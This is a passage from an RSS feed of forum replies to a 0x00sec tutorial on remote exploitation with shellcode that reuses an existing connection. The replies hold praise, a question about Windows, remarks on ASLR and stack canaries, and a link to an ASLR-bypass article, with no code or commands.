        <dc:creator><![CDATA[IoTh1nkN0t]]></dc:creator>
        <description><![CDATA[
            <p>Woah, this is so clever! Awesome tutorial once again, might use this for the Ret2libc tut ^^</p>
          <p><a href="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/9">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/9</link>
        <pubDate>Sat, 07 Jan 2017 02:32:11 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1440-9</guid>
        <source url="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440.rss">Remote Exploit. Shellcode without Sockets</source>
      </item>
      <item>
        <title>Remote Exploit. Shellcode without Sockets</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>AFAIK there is no direct equivalence to this on Windows. I’m pretty sure it should be possible to reuse the existing connection but I bet the process would probably be pretty different… but I do not know how. Maybe some of the windows guy can provide some details.</p>
          <p><a href="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/8</link>
        <pubDate>Sat, 07 Jan 2017 00:37:57 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1440-8</guid>
        <source url="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440.rss">Remote Exploit. Shellcode without Sockets</source>
      </item>
      <item>
        <title>Remote Exploit. Shellcode without Sockets</title>
        <dc:creator><![CDATA[Joe_Schmoe]]></dc:creator>
        <description><![CDATA[
            <p>Clever. Is something like that possible on windows?</p>
          <p><a href="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/7</link>
        <pubDate>Sat, 07 Jan 2017 00:08:45 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1440-7</guid>
        <source url="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440.rss">Remote Exploit. Shellcode without Sockets</source>
      </item>
      <item>
        <title>Remote Exploit. Shellcode without Sockets</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            <p><a class="mention" href="https://0x00sec.org/u/pry0cc">@pry0cc</a>: Enjoy.</p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://s1.wp.com/i/favicon.ico" class="site-icon" width="32" height="32">
      <a href="https://sploitfun.wordpress.com/2015/05/08/bypassing-aslr-part-i/" target="_blank" rel="noopener nofollow ugc" title="11:19AM - 08 May 2015">sploitF-U-N – 8 May 15</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/4/427a827e1b53c708ab0698ed1fac2195d6c45b98.jpeg" class="thumbnail" width="" height="">

<h3><a href="https://sploitfun.wordpress.com/2015/05/08/bypassing-aslr-part-i/" target="_blank" rel="noopener nofollow ugc">Bypassing ASLR – Part I</a></h3>

<p>Prerequisite: Classic Stack Based Buffer Overflow VM Setup: Ubuntu 12.04 (x86) In previous posts, we saw that attacker needs to know stack address (to jump to shellcode) libc base address (to succe…</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

          <p><a href="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/6</link>
        <pubDate>Fri, 06 Jan 2017 21:18:57 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1440-6</guid>
        <source url="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440.rss">Remote Exploit. Shellcode without Sockets</source>
      </item>
      <item>
        <title>Remote Exploit. Shellcode without Sockets</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Teach us master pico!</p>
          <p><a href="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/5</link>
        <pubDate>Fri, 06 Jan 2017 21:11:28 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1440-5</guid>
        <source url="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440.rss">Remote Exploit. Shellcode without Sockets</source>
      </item>
      <item>
        <title>Remote Exploit. Shellcode without Sockets</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>Thanks <a class="mention" href="https://0x00sec.org/u/_py">@_py</a> and <a class="mention" href="https://0x00sec.org/u/pry0cc">@pry0cc</a>. Glad to heard you liked it.</p>
<p>When facing ASLR and stack protections we have to dive into ROP, Return to Libc and other techniques more advanced. I believe it is difficult to follow that without knowing the basics…</p>
          <p><a href="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/4</link>
        <pubDate>Fri, 06 Jan 2017 21:11:01 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1440-4</guid>
        <source url="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440.rss">Remote Exploit. Shellcode without Sockets</source>
      </item>
      <item>
        <title>Remote Exploit. Shellcode without Sockets</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Dude. Bruh.</p>
<aside class="quote no-group" data-username="_py" data-post="2" data-topic="1440" data-full="true">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="20" height="20" src="https://0x00sec.org/user_avatar/0x00sec.org/_py/40/4275_2.png" class="avatar"> _py:</div>
<blockquote>
<p>Kicking 2017 off with a bang. Mamma mia!</p>
</blockquote>
</aside>
<p>:is an understatement.</p>
<p>This is really awesome. The connection reuse thing is such a dope concept.</p>
<p>So. In this example, we deactivated ASLR, and disabled stack canaries. Stack based buffer overflows are all over the web. What can we do today? What do modern day exploits, well, exploit, and how do we bypass ASLR and canaries?</p>
<p>You’ve done a super good job (as always), this is really good work.</p>
<p>- pry0cc</p>
          <p><a href="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/3</link>
        <pubDate>Fri, 06 Jan 2017 20:59:32 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1440-3</guid>
        <source url="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440.rss">Remote Exploit. Shellcode without Sockets</source>
      </item>
      <item>
        <title>Remote Exploit. Shellcode without Sockets</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            <p>Kicking 2017 off with a bang. Mamma mia!</p>
          <p><a href="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/2</link>
        <pubDate>Fri, 06 Jan 2017 17:42:39 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1440-2</guid>
        <source url="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440.rss">Remote Exploit. Shellcode without Sockets</source>
      </item>
  </channel>
</rss>
